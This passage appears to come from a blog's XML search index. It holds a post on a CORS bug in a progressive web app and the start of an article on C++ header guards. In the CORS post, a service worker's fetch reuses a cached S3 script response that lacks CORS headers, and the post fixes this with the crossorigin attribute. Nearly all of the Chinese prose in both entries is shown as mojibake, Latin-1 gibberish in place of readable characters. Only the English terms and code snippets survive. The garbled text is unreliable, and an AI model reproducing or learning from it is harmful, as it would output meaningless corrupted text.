        <tag>æ¼”ç®—æ³•</tag>
        <tag>ç®—æ³•</tag>
        <tag>computer science</tag>
        <tag>é›»è…¦ç§‘å­¸</tag>
      </tags>
  </entry>
  <entry>
    <title>åŸä¾† CORS æ²’æœ‰æˆ‘æƒ³åƒä¸­çš„ç°¡å–®</title>
    <url>/2018/08/18/cors-issue/</url>
    <content><![CDATA[å‰è¨€CORSï¼ˆCross-Origin Resource Sharingï¼Œè·¨ä¾†æºè³‡æºå…±äº«ï¼‰åœ¨å‰ç«¯ä¸€ç›´æ˜¯å€‹å¾ˆç¶“å…¸çš„å•é¡Œï¼Œç°¡å–®ä¾†èªªå°±æ˜¯å› ç‚ºç€è¦½å™¨çš„ä¸€äº›å®‰å…¨è€ƒé‡ï¼Œä½ åœ¨è¼‰å…¥å…¶ä»–ç¶²åŸŸçš„è³‡æºæ™‚æœƒå—åˆ°ä¸€äº›é™åˆ¶ï¼Œè§£æ±ºæ–¹æ³•ä¹Ÿå¾ˆç°¡å–®ï¼Œå°±æ˜¯åœ¨ Server é‚£é‚ŠåŠ ä¸Šä¸€äº› response header ä¾‹å¦‚èªª Access-Control-Allow-Originï¼Œæœ‰äº†é€™å€‹ header ä¹‹å¾Œç€è¦½å™¨å°±æœƒèªç‚ºä½ æ˜¯æœ‰ç¶“éé©—è­‰çš„ï¼Œå°±æ²’ä»€éº¼å•é¡Œäº†ã€‚
é‡å°é€™å€‹å•é¡Œï¼Œæˆ‘ä»¥å‰ä¹Ÿæœ‰å¯«éä¸€ç¯‡ï¼šè¼•é¬†ç†è§£ Ajax èˆ‡è·¨ä¾†æºè«‹æ±‚ï¼Œè£¡é¢æŠŠç¢°åˆ°çš„å•é¡Œèˆ‡è§£æ³•å¯«å¾—ååˆ†è©³ç´°ã€‚
æˆ‘ä»¥ç‚ºè‡ªå¾æˆ‘ä¸Šæ¬¡æ·±å…¥ç ”ç©¶éé€™å€‹å•é¡Œä¹‹å¾Œï¼Œå¾æ­¤ä»¥å¾Œ CORS å†ä¹Ÿé›£ä¸å€’æˆ‘ï¼Œå†ä¹Ÿä¸æœƒçœ‹åˆ° console è·³å‡ºç¦æ­¢è·¨ä¾†æºå­˜å–çš„éŒ¯èª¤ã€‚
ä½†æ˜¯æˆ‘éŒ¯äº†ã€‚
é€™æ¬¡æˆ‘åœ¨ä¸€å€‹ç‰¹å®šçš„ä½¿ç”¨å ´æ™¯ä¹‹ä¸‹æ‘”äº†ä¸€è·¤ï¼Œä½†ä¹Ÿå› æ­¤å­¸åˆ°ä¸å°‘ã€‚è€Œé€™æ¬¡çš„ç¶“é©—ä¹Ÿè®“æˆ‘æƒ³èµ·æˆ‘ä»¥å‰å¯«çš„ï¼šæˆ‘é‡éçš„æœ€é›£çš„ Cookie å•é¡Œ
ã€‚
å¤ªå¥½äº†ï¼Œåˆæœ‰æ±è¥¿å¯ä»¥è·Ÿå¤§å®¶åˆ†äº«äº†ï¼
æ‚²åŠ‡çš„é–‹å§‹äº‹æƒ…æ˜¯é€™æ¨£çš„ï¼Œå‰é™£å­å…¬å¸çš„ç”¢å“æ”¹ç‰ˆé€²å…¥æ”¶å°¾éšæ®µï¼Œåš´é‡çš„ bug éƒ½ä¿®å¾—å·®ä¸å¤šäº†ï¼Œæ¥ä¸‹ä¾†å°±æ˜¯è¦é–‹å§‹èª¿æ•´ä¸€äº›æ•ˆèƒ½ä»¥åŠæ¸¬è©¦é€™æ¬¡æ”¹ç‰ˆæœ€é‡è¦çš„æ–°åŠŸèƒ½ï¼šPWAï¼
é‚„ä¸çŸ¥é“ä»€éº¼æ˜¯ PWA çš„æˆ‘åœ¨é€™é‚Šç°¡å–®èªªæ˜ä¸€ä¸‹ï¼ŒPWA å…¨åæ˜¯ Progressive Web Appï¼Œç°¡å–®ä¾†èªªå°±æ˜¯æŠŠä½ çš„ Mobile Web é€éä¸€äº›ç€è¦½å™¨çš„æ”¯æ´è®Šå¾—æ›´åƒæ˜¯ä¸€å€‹ Appï¼Œæœ€é‡è¦çš„å°±æ˜¯ä½ å¯ä»¥ç”¨ Service Worker ä¾†å¿«å–ä»»ä½•çš„ requestï¼ˆé€£ API request ä¹Ÿè¡Œï¼‰ï¼Œåšå¾—å¥½çš„è©±ç”šè‡³åœ¨ offline çš„ç‹€æ³ä¹Ÿèƒ½å¤ æŠŠé€™å€‹ç¶²é æ‰“é–‹ã€‚
é™¤æ­¤ä¹‹å¤–å‘¢ï¼Œé€éç€è¦½å™¨å¯ä»¥æŠŠä½ çš„ç¶²ç«™åŠ åˆ°ä¸»ç•«é¢ï¼Œå°±åƒæ˜¯å®‰è£åœ¨æ‰‹æ©Ÿè£¡é¢é‚£æ¨£ï¼Œè®Šå¾—è·Ÿä¸€å€‹ App æ²’æœ‰å…©æ¨£ã€‚
ä¸‹é¢é™„ä¸Šä¸‰å¼µæˆªåœ–ï¼Œæœƒè®“å¤§å®¶å° PWA æ›´æœ‰æ„Ÿè¦ºï¼Œé¦–å…ˆç¬¬ä¸€å¼µæ˜¯ä½ å¯ä»¥æŠŠé€™å€‹ç¶²é åŠ å…¥ä¸»ç•«é¢ï¼š

ç¬¬äºŒå¼µæ˜¯é€™å€‹ PWA å°±æœƒè·Ÿå…¶ä»–çš„ Native App ä¸€æ¨£ï¼Œå­˜åœ¨ä½ çš„æ‰‹æ©Ÿè£¡é¢ï¼Œä½ å…‰çœ‹é€™é çµ•å°åˆ†ä¸å‡ºä¾†é€™åˆ°åº•æ˜¯ Native App é‚„æ˜¯ PWAã€‚

æœ€å¾Œä¸€å¼µæ˜¯ä½ é–‹å•Ÿé€™å€‹ PWA ä¹‹å¾Œï¼Œæœƒè®Šæˆå…¨è¢å¹•ï¼Œå…‰çœ‹é€™å€‹æˆªåœ–æ ¹æœ¬å°±è·Ÿ Native App æ²’å…©æ¨£ã€‚

ç¸½ä¹‹å‘¢ï¼Œå¯ä»¥æŠŠ PWA æƒ³æˆï¼šç¾æœ‰çš„ç¶²ç«™ + æ–°æŠ€è¡“ï¼ˆService Workerã€manifest.jsonâ€¦ï¼‰ï¼Œæ­é…èµ·ä¾†å°±å¯ä»¥è®Š PWA äº†ã€‚
å° PWA ç°¡å–®çš„ä»‹ç´¹å°±åˆ°é€™è£¡ï¼Œæƒ³çœ‹æ›´å¤šçš„å¯ä»¥åƒè€ƒ @arvinh å¯«éçš„ï¼šProgressive Web App æœƒæ˜¯æœªä¾†è¶¨å‹¢å—ï¼Ÿæˆ–æ˜¯ç•¶ React web app é‡ä¸Š Progressive web appã€‚
å° PWA ä¾†èªªï¼Œå…¶å¯¦æœ€é‡è¦çš„å°±æ˜¯é€™å€‹ Service Workerï¼ˆä»¥ä¸‹ç°¡ç¨± SWï¼‰ï¼ŒChrome å…§å»ºçš„ Lighthouse å°±å¯ä»¥é‡å°ç¶²é çµ¦ä¸€å€‹ PWA çš„åˆ†æ•¸ï¼ŒSW å°±æ˜¯å…¶ä¸­ä¸€å€‹è€ƒé‡çš„é …ç›®ï¼Œå› ç‚ºä½ å¿…é ˆå¯¦ä½œ SW æ‰èƒ½å¿«å–æª”æ¡ˆä¸¦ä¸”å¯¦ä½œå‡ºé›¢ç·šä¹Ÿèƒ½é–‹å•Ÿ App é€™å€‹åŠŸèƒ½ã€‚
ä¸‹åœ–æ˜¯ Lighthouse æœƒæª¢æ¸¬çš„é …ç›®ï¼š

å¥½ï¼Œå‰æƒ…æè¦çµæŸï¼Œå¯ä»¥ä¾†é€²å…¥æ­£é¡Œäº†ã€‚
æˆ‘å€‘çš„ PWA è©²åšçš„éƒ½åšäº†ï¼Œæœ‰è¨»å†Š SWï¼Œä¹Ÿæœ‰å¯¦ä½œé›¢ç·šå¯ä»¥é–‹å•Ÿçš„åŠŸèƒ½ï¼Œå¯æ˜¯å»ç™¼ç”Ÿäº†ä¸€ä»¶äº‹ï¼Œé‚£å°±æ˜¯åœ¨ Lighthouse çš„æª¢æ¸¬è£¡é¢ï¼Œæœ‰ä¸€é …æ°¸é éƒ½éä¸äº†ï¼Œé‚£å°±æ˜¯è¨»å†Š SWã€‚
ç„¡è«–æª¢é©—å¤šå°‘æ¬¡ï¼ŒLighthouse éƒ½ä¸€ç›´èªªæˆ‘å€‘çš„ç¶²ç«™æ²’æœ‰è¨»å†Š SWã€‚
è¶…ç´šç„¡æ•µå¥‡æ€ªï¼Œæˆ‘é–‹ç„¡ç—•ç”¨ä¹¾æ·¨çš„ Chrome æ‰‹å‹•å»æ¸¬è©¦ï¼Œç„¡è«–æ€éº¼æ¸¬æˆ‘éƒ½ç¢ºèªä¸€å®šæœ‰è¨»å†Š SWï¼Œå¯æ˜¯ Lighthouse æ€éº¼æ¸¬éƒ½èªªæ²’æœ‰ã€‚
é‚£æ€éº¼è¾¦å‘¢ï¼Ÿ
å¹¸å¥½ Lighthouse æ˜¯é–‹æºçš„ï¼Œè€Œä¸”æœ‰æä¾› CLI çš„ç‰ˆæœ¬ï¼Œä½ å¯ä»¥è‡ªå·±åœ¨ä½ é›»è…¦ä¸Šé¢è·‘ã€‚
æ–¼æ˜¯æˆ‘æƒ³èªªæ—¢ç„¶ Lighthouse èªªæ²’æœ‰ï¼Œé‚£æˆ‘å€‘å°±ä¾†çœ‹çœ‹ Lighthouse æ˜¯æ€éº¼æª¢æ¸¬çš„å¥½äº†ï¼Œç„¶å¾Œæˆ‘å°±ç¨å¾®ç ”ç©¶äº†ä¸€ä¸‹ Lighthouse çš„åŸå§‹ç¢¼ï¼Œè¦ºå¾—æª¢æ¸¬çš„æ–¹æ³•çœ‹èµ·ä¾†ä¹Ÿæ²’ä»€éº¼å•é¡Œï¼Œæ–¼æ˜¯æˆ‘æ±ºå®šæŠŠ Lighthouse æ”¹ä¸€ä¸‹ï¼Œè®“å®ƒè·‘å®Œæ¸¬è©¦çš„æ™‚å€™ä¸æœƒæŠŠè¦–çª—é—œèµ·ä¾†ï¼Œé€™æ¨£æˆ‘å°±å¯ä»¥çœ‹ console æœ‰æ²’æœ‰ä»€éº¼æœ‰ç”¨çš„è³‡è¨Šï¼Œçœ‹çœ‹è¨»å†ŠæˆåŠŸæœƒå°çš„è¨Šæ¯æœ‰æ²’æœ‰å°å‡ºä¾†ã€‚
æˆ‘ç¨å¾®æ”¹å‹•äº†å¹¾å€‹åœ°æ–¹ï¼š

å¢åŠ è¨­å®šæª”ï¼Œåªè·‘ SW çš„æ¸¬è©¦
è·‘å®Œä¹‹å¾Œä¸æœƒæŠŠ Chrome é—œæ‰
åœ¨ SW çš„æª¢æŸ¥é‚£é‚Šå° log

å¦‚æœæœ‰éœ€è¦çš„ï¼Œæˆ‘æ›´æ”¹çš„éƒ¨åˆ†åœ¨é€™é‚Šï¼šæ”¹å‹•çš„åœ°æ–¹çš„ PR
æ”¹å®Œä»¥å¾Œé‡æ–°è·‘ä¸€éæ¸¬è©¦ï¼Œé‚£ä¸€åˆ»ï¼Œæˆ‘çµ‚æ–¼æƒ³èµ·äº†è¢« CORS å›°æ“¾ä¸‹çš„ææ‡¼ï¼š

æ’¥é›²è¦‹æ—¥æ—¢ç„¶æœ‰äº†ä¸€äº›ç·šç´¢å°±æ‡‰è©²å¥½å¥½è¿½æŸ¥ä¸‹å»ï¼Œå¾æˆªåœ–è£¡é¢çœ‹èµ·ä¾†ï¼ŒSW æ˜¯æˆåŠŸè¨»å†Šäº†ï¼Œä½†æ˜¯åœ¨ç”¨ SW å¿«å–æª”æ¡ˆçš„æ™‚å€™ç¢°åˆ°ä¸€äº›éŒ¯èª¤ï¼Œæ‰€ä»¥å¥½åƒé€£å¸¶å½±éŸ¿äº†æ•´å€‹æ¸¬è©¦ã€‚ç¸½ä¹‹å‘¢ï¼Œåªè¦æŠŠé€™å€‹ CORS å•é¡Œè§£æ±ºæ‰å°±æ²’äº‹äº†å§ã€‚
å…ˆå¹«å¤§å®¶å†åšå€‹èƒŒæ™¯èªªæ˜ï¼Œæˆ‘å€‘é€™äº›éœæ…‹æª”æ¡ˆéƒ½æ˜¯æ”¾åœ¨ Amazon S3ï¼Œç„¶å¾Œå‰é¢å†æ› Cloudfrontï¼Œæˆ‘å€‘å·²ç¶“æœ‰ä¹–ä¹–æŒ‰ç…§ Amazon çš„æŒ‡ç¤ºåŠ ä¸Šè©²åŠ çš„æ±è¥¿ï¼Œæ‰€ä»¥åªè¦ request header æœ‰ originï¼Œresponse å°±ä¸€å®šæœƒæœ‰ CORS çš„ headerï¼Œæ‰€ä»¥ä¸€å®šä¸æœƒç™¼ç”Ÿé€™å€‹éŒ¯èª¤ã€‚
è€Œ SW åœ¨å¿«å–æª”æ¡ˆçš„æ™‚å€™æ˜¯ç”¨ fetchï¼Œæ‰€ä»¥ä¹Ÿä¸€å®šæœƒåŠ ä¸Š origin é€™å€‹ headerï¼Œæ²’ç†ç”±å‡ºå•é¡Œã€‚
å¤§æ¦‚å¡äº†ä¸€å…©å€‹å°æ™‚é‚„æ˜¯é‚„ç„¡é ­ç·’ï¼Œæ–¼æ˜¯æˆ‘æ±ºå®šçœ‹ä¸€ä¸‹ network çš„ tabï¼Œç™¼ç¾äº†æ›´å¤šç·šç´¢ï¼š
ä¸‹é¢é€™ä¸€å¼µæ˜¯å¾ SW è£¡é¢ç™¼å‡ºçš„ requestï¼Œheader è£¡é¢ç¢ºå¯¦æœ‰ originï¼Œå¯æ˜¯ response å»æ²’æœ‰ Access-Control-Allow-Originï¼
é™¤æ­¤ä¹‹å¤–ï¼Œç™¼ç¾æ›´æ—©ä»¥å‰ä¹Ÿæœ‰ä¸€å€‹ç›¸åŒçš„ requestï¼Œå› ç‚ºé€™å€‹ request æ˜¯ç”± &lt;script&gt; ç™¼å‡ºçš„ï¼Œæ‰€ä»¥ä¸æœƒå¸¶ä¸Š originï¼Œå› æ­¤ response ä¹Ÿå°±æ²’æœ‰ CORS çš„ headerã€‚
è€Œé€™é‚Šå€¼å¾—æ³¨æ„çš„äº‹æƒ…æ˜¯ï¼Œç¬¬äºŒå€‹ response æ˜¯ from disk cacheï¼ˆé›–ç„¶ä¸Šé¢å…©å€‹éƒ½æ˜¯ï¼Œä½†é‚£æ˜¯å› ç‚ºæˆ‘æˆªåœ–çš„æ™‚å€™æ±è¥¿æ²’æ¸…ç©ºï¼Œäº‹å¯¦ä¸Šæ‡‰è©²åªæœ‰ç¬¬äºŒå€‹æ˜¯ï¼‰
æŸ¥ç·šç´¢æŸ¥åˆ°é€™è£¡ï¼Œå¤§æ¦‚æœ‰é»é ­ç·’äº†ã€‚
æ·±å…¥è¿½æŸ¥å¥½ï¼Œè®“æˆ‘å…ˆä¾†è§£é‡‹ä¸€ä¸‹ã€‚
SW æ‰€è¦å¿«å–çš„é‚£å€‹æª”æ¡ˆæ˜¯é é¢æœƒè¼‰å…¥çš„å…¶ä¸­ä¸€å€‹ JavaScriptï¼Œè€Œå› ç‚ºé é¢æœƒè¼‰å…¥ï¼Œæ‰€ä»¥åœ¨ HTML è£¡é¢æˆ‘å€‘æ”¾äº†ä¸€å€‹ &lt;script&gt; çš„ tag ä¾†è¼‰å…¥é€™å€‹æª”æ¡ˆï¼Œå¾ä¸Šé¢çš„åœ–ç‰‡çœ‹èµ·ä¾†ï¼Œç€è¦½å™¨å…ˆè¼‰å…¥äº†é€™å€‹ JavaScript æª”æ¡ˆï¼Œç„¶å¾Œå› ç‚ºé€™å€‹æª”æ¡ˆä¸æ˜¯ç”¨ ajax ç™¼å‡ºï¼Œæ‰€ä»¥æ²’æœ‰ originï¼Œæ ¹æ“š S3 çš„è¦å®šï¼Œä¹Ÿå°±è‡ªç„¶æ²’æœ‰ Access-Control-Allow-Originã€‚
å†ä¾†å‘¢ï¼ŒSW è¨»å†ŠæˆåŠŸï¼Œé–‹å§‹åŸ·è¡Œè£¡é¢çš„ç¨‹å¼ç¢¼æŠŠæˆ‘å€‘é å…ˆæº–å‚™å¥½çš„æ¸…å–®çµ¦å¿«å–ä½ï¼Œå…¶ä¸­ä¸€å€‹å°±æ˜¯é€™å€‹ JavaScript çš„æª”æ¡ˆï¼Œä½†æ˜¯ç•¶æˆ‘å€‘ç”¨ fetch ä¾†æŠ“é€™å€‹æª”æ¡ˆæ™‚ï¼Œç€è¦½å™¨ç›´æ¥ç”¨äº†å¿«å–ä½çš„å‰ä¸€å€‹çš„ responseï¼ˆå› ç‚º URLã€method éƒ½ä¸€æ¨£ï¼‰ï¼Œè€Œé€™å€‹ response æ˜¯æ²’æœ‰ Access-Control-Allow-Origin çš„ï¼å› æ­¤å°±è·³å‡ºäº†æˆ‘å€‘æœ€å‰é¢çœ‹åˆ°çš„è·¨ç¶²åŸŸçš„éŒ¯èª¤ã€‚
åˆ°é€™é‚ŠçœŸç›¸å¤§ç™½äº†ï¼Œéƒ½æ˜¯ç€è¦½å™¨å¿«å–çš„å•é¡Œã€‚
é‚£ç‚ºä»€éº¼æˆ‘ä¹‹å‰è‡ªå·±æ¸¬éƒ½æ¸¬ä¸å‡ºä¾†å‘¢ï¼Ÿå› ç‚ºèº«ç‚ºä¸€å€‹å‰ç«¯å·¥ç¨‹å¸«ï¼Œdevtool æœ‰æŠŠã€ŒDisable cacheã€æ‰“å‹¾æ˜¯å¾ˆåˆæƒ…åˆç†çš„äº‹ï¼Œæ‰€ä»¥æˆ‘æ€éº¼è©¦éƒ½è©¦ä¸å‡ºä¾†é€™å€‹å•é¡Œã€‚
çŸ¥é“å•é¡Œçš„æˆå› ä¹‹å¾Œå°±æ¯”è¼ƒç°¡å–®äº†ï¼Œæ‹œäº† Google å¤§ç¥æŸ¥åˆ°äº†é€™ä¸€ç¯‡ Chromium çš„ ticketï¼šCORS Preflight Cache Does not Consider Origin
è£¡é¢ç¢°åˆ°çš„å•é¡ŒåŸºæœ¬ä¸Šè·Ÿæˆ‘ç¢°åˆ°çš„å·®ä¸å¤šï¼Œæœ€å¾Œçµ¦çš„è§£æ³•æ˜¯ response åŠ ä¸Šä¸€å€‹ Vary: Originï¼Œè®“ç€è¦½å™¨çŸ¥é“å¦‚æœ Origin ä¸ä¸€æ¨£çš„è©±å°±ä¸è¦ç”¨å¿«å–ï¼Œå¯æ˜¯æˆ‘ç™¼ç¾æˆ‘å€‘æ—©å°±åŠ äº†ä½†ä¸çŸ¥é“ç‚ºä»€éº¼æ²’ç”¨ã€‚
é™¤æ­¤ä¹‹å¤–ä¹Ÿæ‰¾åˆ°å¹¾å€‹é¡ä¼¼çš„å•é¡Œï¼š

Chrome S3 Cloudfront: No â€˜Access-Control-Allow-Originâ€™ header on initial XHR request
S3 CORS, always send Vary: Origin

å¾Œä¾†æ¡ç”¨è£¡é¢å…¶ä¸­ä¸€å€‹çš„è§£æ³•ï¼šã€Œæ—¢ç„¶ S3 è¦æœ‰ origin header æ‰èƒ½é–‹å•Ÿ CORSï¼Œé‚£å°±ç”¨ Cloudfront å‚³ä¸€å€‹å›ºå®šçš„ origin çµ¦å®ƒå§ï¼é€™æ¨£æ¯å€‹ response éƒ½ä¸€å®šæœƒæœ‰ Access-Control-Allow-Origin äº†ï¼ã€
å¯ä»¥åƒè€ƒé€™ç¯‡ï¼šAWS CloudFront + S3 + Allow all CORSï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯èª¿ä¸€å€‹è¨­å®šè€Œå·²ã€‚
é€™æ‹›è½èµ·ä¾†æ»¿æœ‰æ•ˆçš„ï¼Œä½†å…¶å¯¦ä¸æ˜¯æœ€å¥½çš„è§£æ³•ï¼Œæ„Ÿè¦ºæœ‰é»éª¯é«’ï¼Œç•¢ç«Ÿ origin é€™æ±è¥¿ä¸æ˜¯é€™æ¨£ç”¨çš„ï¼Œç‚ºäº† S3 çš„æ©Ÿåˆ¶ç¡¬è¦é€™æ¨£åšç¸½è¦ºå¾—ä¸æ˜¯å¤ªå¥½ã€‚
æ–¼æ˜¯æœ€å¾Œæˆ‘å°±æƒ³åˆ°ä¸€å€‹æ±è¥¿ï¼ŒåŒæ™‚ä¹Ÿè§£æ±ºäº†å¿ƒä¸­çš„ä¸€å€‹ç–‘æƒ‘ã€‚
é‚£å°±æ˜¯åœ¨&lt;script&gt;åŠ ä¸Š crossorigin=&quot;anonymous&quot;ï¼Œè®“&lt;script&gt;ç™¼å‡ºå»çš„ request ä¹Ÿæœ‰ origin headerï¼
æˆ‘ä»¥å‰å°±çœ‹åˆ°æŸäº›åœ°æ–¹æœƒåŠ é€™å€‹ï¼Œä½†å§‹çµ‚ä¸æ‡‚ç‚ºä»€éº¼è¦åŠ ï¼Œå› ç‚º script æœ¬ä¾†å°±å¯ä»¥ä¸é™åˆ¶ç¶²åŸŸï¼Œç‚ºä»€éº¼é‚„è¦ç‰¹åœ°åŠ ä¸€å€‹ tag è®“å®ƒè®Šæˆåƒ ajax é‚£æ¨£çš„ requestï¼Ÿ
ä½†æ²’æƒ³åˆ°æˆ‘å±…ç„¶è¢«é€™å€‹å±¬æ€§å¹«åŠ©åˆ°äº†ï¼Œä¸€æ—¦æˆ‘åŠ äº†é€™å€‹ï¼Œé‚£ script çš„è¼‰å…¥å°±æœƒé™„ä¸Š Originï¼ŒS3 å°±æœƒå›å‚³ Access-Control-Allow-Originï¼Œä¹Ÿå°±ä¸æœƒç¢°åˆ°ä¹‹å¾Œçš„è·¨ç¶²åŸŸå•é¡Œäº†ï¼
è‡³æ–¼é€™å€‹å±¬æ€§å…¶ä»–çš„åŠŸç”¨ï¼Œå¯åƒè€ƒï¼šPurpose of the crossorigin attribute â€¦?
ç¸½çµè¦ç¢°åˆ°æˆ‘æ‰€ç¢°åˆ°çš„é€™å€‹å•é¡Œï¼Œä½ å¿…é ˆåŒæ™‚æ»¿è¶³ä¸‹é¢å››å€‹æ¢ä»¶ï¼š

ä½ æŠŠéœæ…‹æª”æ¡ˆæ”¾åœ¨ S3 ä¸Šé¢
ä½ æ²’æœ‰å‹¾é¸ç€è¦½å™¨çš„ Disable cache
ä½ ç”¨ script è·Ÿ SW è¼‰å…¥åŒä¸€å€‹æª”æ¡ˆ
ç€è¦½å™¨ç”¨å¿«å–çš„ script çš„ response å›æ‡‰ SW çš„è«‹æ±‚

åªè¦ä»»ä½•ä¸€å€‹æ¢ä»¶æ²’æœ‰æ»¿è¶³ï¼Œå°±ä¸æœƒç¢°åˆ°é€™å•é¡Œã€‚æ›å¥è©±èªªï¼Œè¦è¸©åˆ°é€™å€‹å‘å…¶å¯¦ä¹ŸæŒºå›°é›£çš„ã€‚
ä½†å‘è¸©çš„è¶Šå¤šå°±è¶Šå¼·ï¼Œè§£æ±ºäº†ä¸€å€‹å•é¡Œå°±ä»£è¡¨ä½ æœªä¾†æœƒç¢°åˆ°çš„å•é¡Œåˆå°‘äº†ä¸€å€‹ã€‚è§£æ±ºæ‰é€™å€‹ CORS ç›¸é—œçš„å•é¡Œï¼Œæˆ‘æƒ³æˆ‘ä»¥å¾Œæ‡‰è©²ä¸æœƒå†ç¢°åˆ°ç›¸é—œçš„å•é¡Œäº†â€¦å§ã€‚
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>cors</tag>
        <tag>pwa</tag>
      </tags>
  </entry>
  <entry>
    <title>C++ Header Guard ç°¡ä»‹</title>
    <url>/2017/09/30/cpp-header-guard/</url>
    <content><![CDATA[å‰è¨€C++ çš„ header guard (ä¸­æ–‡è­¯ä½œè¡¨é ­å“¨å…µï¼Œè½èµ·ä¾†è¶…å¸¥) æ˜¯åœ¨é–‹æº&#x2F;å¤§å‹å°ˆæ¡ˆä¸­å¸¸å¸¸ç”¨åˆ°çš„åŠŸèƒ½ï¼Œæ‰€ä»¥å¦‚æœæƒ³è¦è¸å…¥é–‹æºå°ˆæ¡ˆçš„ä¸–ç•Œï¼Œçœ‹åˆ° header guard å°±è¦ºå¾—è¦ªåˆ‡ç†Ÿæ‚‰ï¼Œçµ•å°å¯ä»¥å¹«åŠ©ä½ æ›´æŠŠå¿ƒæ€æ”¾åœ¨é«”æœƒåˆ°é€™äº›é–‹æºç¨‹å¼ç¢¼çš„ç¾ï¼
è€Œä¸”é€™å€‹ä¾‹å­æ­£å·§æ˜¯æœ‰æœ‹å‹å»é¢è©¦ç¾åœ‹æŸé–“æ–°å‰µå…¬å¸æ™‚ï¼Œå¯¦éš›è¢«å•åˆ°çš„å•é¡Œï¼Œæ‰€ä»¥æ‰èˆˆèµ·æƒ³è¦å‹•ç­†å¯«ä¸‹é€™ç¯‡æ–‡ç« çš„å¿µé ­ã€‚ç•¢ç«Ÿå¾ˆå¤šå°åœ°æ–¹æœ‰æ²’æœ‰çœŸæ­£å¼„é€šæ˜¯æŠ€è¡“å¯¦åŠ›ç´®ä¸ç´®å¯¦çš„é‡è¦æŒ‡æ¨™ï¼
æˆ‘å‰›å‰›éš¨ä¾¿é¸äº†ä¸€å€‹ C++ çš„é–‹æºå°ˆæ¡ˆ (Point Cloud Library) çš„ header æª”ï¼Œè£¡é¢å°±æœ‰ç”¨åˆ°
#ifndef PCL_PEOPLE_PERSON_CLASSIFIER_H_#define PCL_PEOPLE_PERSON_CLASSIFIER_H_#include &lt;pcl/people/person_cluster.h&gt;#include &lt;pcl/people/hog.h&gt;...#include &lt;pcl/people/impl/person_classifier.hpp&gt;#endif /* PCL_PEOPLE_PERSON_CLASSIFIER_H_ */

é è™•ç†å™¨ç°¡ä»‹é¦–å…ˆæˆ‘å€‘éœ€è¦å° header file çš„ä½¿ç”¨æœ‰å€‹åˆæ­¥çš„èªè­˜ï¼Œé€™å°±ä¸èƒ½ä¸ä»‹ç´¹ä¸€ä¸‹é è™•ç†å™¨ã€‚æˆ‘å€‘éƒ½çŸ¥é“ï¼Œè¦ä½¿ç”¨ header file å°±æ˜¯è¦åœ¨ç¨‹å¼ç¢¼ä¸­ #include å®ƒï¼Œè€Œ #include å°±æ˜¯é è™•ç†å™¨çš„ä¸€éƒ¨åˆ†ã€‚
é è™•ç†å™¨å­˜åœ¨çš„ç›®çš„æ˜¯ç‚ºäº†è™•ç†ç¨‹å¼ç¢¼å…§çš„æ–‡æœ¬ï¼Œä¾‹å¦‚ header file çš„å…§å®¹ï¼Œä¹‹æ‰€ä»¥ç¨±åš â€œé â€ è™•ç†å™¨æ˜¯å› ç‚ºä»–åœ¨ç·¨è­¯æ°£åŸ·è¡Œä¹‹å‰å°±æœƒå…ˆåšäº‹äº†ã€‚ä»¥ header file çš„ä¾‹å­ä¾†èªªï¼Œé è™•ç†å™¨æœƒä»¥ header file çš„å…§å®¹å–ä»£ #include é‚£ä¸€è¡Œã€‚
é‚£ç‚ºä½•éœ€è¦ header guardåŸå› æ˜¯ï¼Œheader file ä¹Ÿå¸¸å¸¸éœ€è¦ #include å…¶ä»– header fileï¼Œä¾‹å¦‚å¯«ç¨‹å¼æ™‚å¯èƒ½æœƒå¯«åˆ°å¦‚ä¸‹çš„ç¨‹å¼ç¢¼ï¼š
main.cpp:
#include &lt;string&gt;#include &quot;myHeader1.h&quot;#include &quot;myHeader2.h&quot;...

myHeader1.h:
#include &lt;string&gt;...

å¦‚æœåœ¨ myHeader1.h è£¡é¢ä¹Ÿéœ€è¦ç”¨åˆ° stringï¼Œé‚£å¯æƒ³è€ŒçŸ¥ç¶“éé è™•ç†å™¨çš„è™•ç†å¾Œï¼Œmain.cpp è£¡é¢å°±æœƒæœ‰å…©æ¬¡ #include &lt;string&gt;ï¼Œä½†é€™ç¨®æƒ…æ³æ ¹æœ¬è¶…ç´šå¸¸è¦‹å•Šï¼Œæˆ‘å€‘ç¸½ä¸å¯èƒ½éƒ½å»æª¢æŸ¥é myHeader1.hã€myHeader2.h è·Ÿä»–å€‘ include çš„æ‰€æœ‰ header file å†æ±ºå®šè‡ªå·±è¦ä¸è¦ #include &lt;string&gt; å§ã€‚æ‰€ä»¥å°±è¦æœ‰å€‹æ©Ÿåˆ¶ï¼Œè®“ header file å³ä¾¿è¢« include å¤šæ¬¡ï¼Œä¹Ÿä¸æœƒæœ‰å…¶å…§å®šç¾©çš„ classes å’Œ objects è¢«å¤šæ¬¡å®šç¾©ã€‚è€Œé€šå¸¸ï¼Œæˆ‘å€‘å°±æ˜¯ç”¨ header guard ä¾†åšé€™ä»¶äº‹ã€‚
header guard æ€éº¼é‹ä½œé€™æ™‚å€™å°±è®“æˆ‘å€‘å†å›éé ­ä¾†çœ‹çœ‹å‰è¨€æåˆ°çš„ä¾‹å­ï¼š
#ifndef PCL_PEOPLE_PERSON_CLASSIFIER_H_#define PCL_PEOPLE_PERSON_CLASSIFIER_H_#include &lt;pcl/people/person_cluster.h&gt;#include &lt;pcl/people/hog.h&gt;...#include &lt;pcl/people/impl/person_classifier.hpp&gt;#endif /* PCL_PEOPLE_PERSON_CLASSIFIER_H_ */

